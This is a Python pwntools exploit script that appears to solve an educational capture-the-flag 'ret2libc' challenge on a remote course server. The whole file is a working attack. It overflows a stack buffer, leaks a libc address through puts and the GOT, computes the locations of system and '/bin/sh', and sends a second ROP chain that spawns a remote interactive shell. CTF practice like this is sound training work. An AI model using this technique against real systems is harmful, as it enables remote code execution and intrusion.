from pwn import *

context(arch='amd64', os='linux', log_level='debug')

## LIBC offsets
# libc-2.27.so
#
# __lib_start_main() offset relative to libc
# by: readelf -s libc.so
#  libc_start_main__libc_off = 0x0000000000021ab0
#  system__libc_off = 0x000000000004f440
#
# by: strings -t x ./libc.so | grep /bin/sh
# or: ELF('libc.so').search('/bin/sh').__next__()
#  binsh__libc_off = 0x1b3e9a

# NOTE: somehow the above isn't correct, so use pwntools
l = ELF('libc.so')
#  l = ELF('/lib64/libc-2.17.so')
libc_start_main__libc_off = l.sym.__libc_start_main
system__libc_off = l.sym.system
binsh__libc_off = l.search(b'/bin/sh').__next__()



## binary symbols
l = ELF('ret2libc')
# by: objdump -R ./ret2libc
#  libc_start_main__got = 0x0000000000600ff0
libc_start_main__got = l.got.__libc_start_main

# by: objdump -j .plt -d ./ret2libc
#  puts_plt = 0x0000000000400520
#  gets_plt = 0x0000000000400530
#  main = 0x0000000000400698
puts_plt = l.sym.puts
gets_plt = l.sym.gets
main = l.sym.main


## ROP gadgets
# by: ROPGadget --binary ./ret2libc
pop_rdi = 0x0000000000400733
ret = 0x0000000000400506


r = remote('edu-ctf.csie.org', 10175)
#  r = remote('localhost', 1111)
pause()

r.sendlineafter(':D\n', flat(
    'a' * 0x38,

    # puts(libc_start_main__got)
    pop_rdi,
    libc_start_main__got,
    puts_plt,

    main,
))

# leak libc loaded base address
libc_start_main__ld_addr = u64( r.recv(6) + b'\0\0') # note the null bytes
libc__ld_addr = libc_start_main__ld_addr - libc_start_main__libc_off
log.success(hex(libc__ld_addr))

system__ld_addr = libc__ld_addr + system__libc_off
bin_sh_str = libc__ld_addr + binsh__libc_off
log.success(hex(system__ld_addr))
log.success(hex(bin_sh_str))

r.sendlineafter(':D\n', flat(
    'a' * 0x38,

    ret, # stack padding

    # system('/bin/sh')
    pop_rdi,
    bin_sh_str,
    system__ld_addr,
))

r.interactive()
